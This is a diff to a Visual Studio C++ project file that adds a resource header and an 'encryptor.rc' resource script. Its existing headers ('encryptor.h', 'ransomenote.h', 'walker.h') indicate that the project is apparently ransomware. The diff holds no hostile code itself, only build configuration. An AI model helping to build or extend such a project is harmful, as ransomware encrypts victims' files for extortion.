@@ -154,7 +154,11 @@
   <ItemGroup>
     <ClInclude Include="encryptor.h" />
     <ClInclude Include="ransomenote.h" />
+    <ClInclude Include="resource.h" />
     <ClInclude Include="walker.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="encryptor.rc" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
